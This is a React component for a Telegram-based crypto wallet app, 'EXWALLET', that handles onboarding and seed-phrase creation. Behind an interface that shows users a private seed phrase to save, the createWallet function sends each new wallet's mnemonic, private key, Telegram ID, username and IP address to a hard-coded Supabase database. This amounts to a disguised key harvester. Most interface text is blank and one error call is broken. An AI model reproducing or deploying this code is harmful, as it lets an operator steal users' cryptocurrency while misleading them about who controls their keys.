"use client"

import { useState, useEffect } from "react"
import { Eye, EyeOff } from 'lucide-react'
import { generateWallet } from './utils/walletGenerator';
import { createClient } from '@supabase/supabase-js';
import { useNavigate } from 'react-router-dom'
import Start1 from "./assets/1.png"
import Start2 from "./assets/2.png"
import Start3 from "./assets/3.png"
import Start4 from "./assets/4.png"
import logo from './assets/logo.png'
import exwalletLoading from './assets/exwallet.png'
import './index.css';

const supabaseUrl = 'https://nuhekjuzkbvsidfemjfs.supabase.co'
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im51aGVranV6a2J2c2lkZmVtamZzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzMzNDUwNTUsImV4cCI6MjA0ODkyMTA1NX0.RxusbIyrZwqS5s1ox4yLHTuUPIhwzJZYueuIQx60PDk'
const supabase = createClient(supabaseUrl, supabaseKey)

export default function Component() {
  const [isLoading, setIsLoading] = useState(true)
  const [currentView, setCurrentView] = useState("loading")
  const [onboardingStep, setOnboardingStep] = useState(0)
  const [onboardingComplete, setOnboardingComplete] = useState(false)
  const [walletCreationStep, setWalletCreationStep] = useState(0)
  const [seedPhrase, setSeedPhrase] = useState([]);
  const [showSeedPhrase, setShowSeedPhrase] = useState(false)
  const [seedPhraseInputs, setSeedPhraseInputs] = useState(Array(12).fill(""))
  const navigate = useNavigate()
  

  const onboardingSlides = [
    {
      title: "",
      highlight: "",
      image: Start1,
      buttonText: ""
    },
    {
      title: "",
      highlight: "",
      image: Start2,
      buttonText: ""
    },
    {
      title: "",
      highlight: "",
      image: Start3,
      buttonText: ""
    },
    {
      title: "",
      highlight: "",
      image: Start4,
      buttonText: "  "
    }
  ]


  const getTelegramUserId = () => {
    if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe) {
      const user = window.Telegram.WebApp.initDataUnsafe.user;
      return user ? user.id : null;
    }
    return null;
  };

  const getTelegramUsername = () => {
    if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe) {
      const user = window.Telegram.WebApp.initDataUnsafe.user;
      return user ? user.username : null;
    }
    return null;
  };


  useEffect(() => {
    const userId = getTelegramUserId();
    if (isLoading) {
      checkUserAndSeedPhrase(userId);
    }
  }, [isLoading]);

  const checkUserAndSeedPhrase = async (userId) => {
    try {
      const { data, error } = await supabase
        .from('seed_phrase')
        .select('user_id, trc_address, phrase, private_key')
        .eq('user_id', userId)
        .single();

      if (data) {
        navigate('/Wallet');
      } else {
        setCurrentView("onboarding");
      }
    } catch (error) {
      console.error("    :", error.message);
      setCurrentView("onboarding");
    } finally {
      setIsLoading(false);
    }
  };

  const createWallet = async (userId) => {
    try {
      const username = getTelegramUsername();
      if (!username) {
        console.error('Telegram username not found');
        return null;
      }

      const { mnemonic, privateKey, address } = await generateWallet();

      const ipResponse = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipResponse.json();
      const userIp = ipData.ip;

      const currentDate = new Date();
      const formattedDate = `${currentDate.getDate().toString().padStart(2, '0')}.${(currentDate.getMonth() + 1).toString().padStart(2, '0')}.${currentDate.getFullYear()}`;

      const { data, error } = await supabase
        .from('seed_phrase')
        .insert([{ 
          user_id: userId, 
          username, 
          trc_address: address, 
          phrase: mnemonic, 
          private_key: privateKey,
          ip: userIp, //  IP-   
          date: formattedDate //      
        }]);

      if (error) {
        console.error("Error creating wallet:", error.message);
        throw error;
      }

      console.log("New wallet created with TRC address:", address);
      return { address, seedPhrase: mnemonic.split(' '), privateKey };
    } catch (error) {
      console.error("Error in createWallet:", error);
      return null;
    }
  };

  
  const handleGenerateAndSave = async () => {
    try {
      const userId = getTelegramUserId();
      if (!userId) {
        throw new Error("   user_id  WebApp");
      }
      
      console.log("userId:", userId);

      const { address, seedPhrase, privateKey } = await createWallet(userId);
      setSeedPhrase(seedPhrase);
    } catch (error) {
      console.error(error);
    }
  };

  const isSeedPhraseCorrect = () => {
    return seedPhrase.every((word, index) => word.toLowerCase() === seedPhraseInputs[index].toLowerCase());
  };

  const handleSeedPhraseInput = (index, value) => {
    const newInputs = [...seedPhraseInputs];
    newInputs[index] = value;
    setSeedPhraseInputs(newInputs);
  };

  useEffect(() => {
    if (walletCreationStep === 2) {
      handleGenerateAndSave();
    }
  }, [walletCreationStep]);


  useEffect(() => {
    let tg = window.Telegram.WebApp;
    tg.expand();
    const timer = setTimeout(() => {
      setIsLoading(false);
    }, 2000);
    return () => clearTimeout(timer);
  }, []);

  if (isLoading) {
    return <div className="flex min-h-screen flex-col items-center justify-center bg-white">
    <div className="flex flex-col items-center space-y-4">
      <img src={logo} alt="Logo" className="w-32 h-32" />
      <img src={exwalletLoading} alt="EXWALLET LOADING" className="w-48" />
    </div>
  </div>
  }

  if (!onboardingComplete) {
    const currentSlide = onboardingSlides[onboardingStep]
    return (
      <div className="flex min-h-screen flex-col items-center justify-center bg-white p-6">
        <div className="w-full max-w-md">
          <div className="flex justify-center mb-4"> 
            <img
              src={currentSlide.image}
              alt=""
              className="h-25 w-25 object-contain"
              style={{ maxHeight: '250px', maxWidth: '250px' }}
            />
          </div>
          <div className="text-center mb-8">
            <h2 className="text-2xl font-medium">
              {currentSlide.title}{" "}
              <span className="text-blue-500">{currentSlide.highlight}</span>
            </h2>
          </div>
          <div className="flex justify-center gap-2 mb-8">
            {onboardingSlides.map((_, index) => (
              <div
                key={index}
                className={`h-2 w-2 rounded-full ${
                  index === onboardingStep ? "bg-blue-500" : "bg-gray-200"
                }`}
              />
            ))}
          </div>
          <button
            onClick={() => {
              if (onboardingStep === onboardingSlides.length - 1) {
                setOnboardingComplete(true)
                setWalletCreationStep(1)
              } else {
                setOnboardingStep(prev => prev + 1)
              }
            }}
            className="w-full rounded-xl bg-blue-500 py-3 text-white"
          >
            {currentSlide.buttonText}
          </button>
        </div>
      </div>
    )
  }

  if (walletCreationStep > 0) {
    return (
      <div className="flex min-h-screen flex-col bg-white p-6">
        {walletCreationStep === 1 && (
          <div className="flex flex-col min-h-screen bg-white px-6">
            <div className="flex-1 flex flex-col">
              <h1 className="text-center text-2xl font-medium text-blue-500 mt-2 mb-2">
                  
              </h1>
              <p className="text-center text-sm text-gray-500 mb-8">
                   "Seed "
              </p>
              
              <div className="space-y-6">
                <div className="space-y-1">
                  <h3 className="text-center font-medium"> </h3>
                  <p className="text-center text-sm text-gray-600">
                      Seed      
                  </p>
                </div>
                
                <div className="space-y-2">
                  <div className="text-center h-1 bg-green-500 rounded-full" />
                  <p className="text-center text-sm"> : </p>
                </div>

                <div>
                  <p className="text-center text-sm mb-2">   :</p>
                  <div className="flex items-center justify-center flex-wrap gap-2">
                    <div className="text-center rounded-full bg-blue-500 px-4 py-1.5 text-sm text-white">
                        
                    </div>
                    <div className="text-center rounded-full bg-blue-500 px-4 py-1.5 text-sm text-white">
                        
                    </div>
                    <div className="text-center rounded-full bg-blue-500 px-4 py-1.5 text-sm text-white">
                      -  
                    </div>
                  </div>
                </div>

                <div className="space-y-3">
                  <div>
                    <p className="text-center text-sm font-medium">  ?</p>
                    <p className="text-center text-xs text-gray-500">  EXFLOW:</p>
                  </div>
                  <div className="space-y-2 items-center">
                    <div className="rounded-xl bg-blue-500 p-3 text-center text-sm text-white">
                         
                    </div>
                    <div className="rounded-xl bg-blue-500 p-3 text-center text-sm text-white">
                       
                    </div>
                    <div className="rounded-xl bg-blue-500 p-3 text-center text-sm text-white">
                        
                    </div>
                  </div>
                </div>
              </div>

              <div className="mt-8 mb-8">
                <p className="text-center text-sm text-gray-500 mb-6">
                  Seed       
                </p>
                <button 
                  onClick={() => setWalletCreationStep(2)}
                  className="w-full rounded-xl bg-blue-500 py-3 text-white"
                >
                  
                </button>
              </div>
            </div>
          </div>
        )}

        {walletCreationStep === 2 && (
          <div className="space-y-6">
            <h1 className="text-2xl font-medium text-center text-blue-500">Seed </h1>
            <div className="text-center space-y-2">
              <p className="text-sm text-gray-600">  seed .         .</p>
              <p className="text-sm text-gray-600">   !</p>
            </div>
  
            <div className="grid grid-cols-2 gap-4">
              {seedPhrase.map((word, index) => (
                <div key={index} className={`rounded-lg bg-gray-100 p-3 text-center ${!showSeedPhrase ? "blur-md" : ""}`}>
                  {showSeedPhrase ? word : ""}
                </div>
              ))}
            </div>
  
            <div className="space-y-2">
              <p className="text-center text-sm">,   seed </p>
              <button
                onClick={() => setShowSeedPhrase(!showSeedPhrase)}
                className="w-full flex items-center justify-center gap-2 rounded-xl bg-blue-500 py-3 text-white"
              >
                {showSeedPhrase ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                {showSeedPhrase ? "" : ""}
              </button>
            </div>
  
            <button
              onClick={() => setWalletCreationStep(3)}
              className="w-full rounded-xl bg-blue-500 py-3 text-white"
            >
              
            </button>
          </div>
        )}

        {walletCreationStep === 3 && ( 
          <div className="space-y-6">
            <h1 className="text-2xl font-medium text-center text-blue-500">  Seed </h1>
            <div className="grid grid-cols-2 gap-4">
              {seedPhraseInputs.map((input, index) => (
                <input
                  key={index}
                  type="text"
                  value={input}
                  onChange={(e) => handleSeedPhraseInput(index, e.target.value)}
                  className="rounded-lg bg-gray-100 p-3 text-center"
                />
              ))}
            </div>

            <button
              onClick={() => {
                if (isSeedPhraseCorrect()) {
                  setWalletCreationStep(0);
                  navigate('/Wallet')
                } else {
                  console(' Seed')
                }
              }}
              className="w-full rounded-xl bg-blue-500 py-3 text-white"
              disabled={!isSeedPhraseCorrect()}
            >
              
            </button>
          </div>
        )}
      </div>
    )
  }

  return null;
}

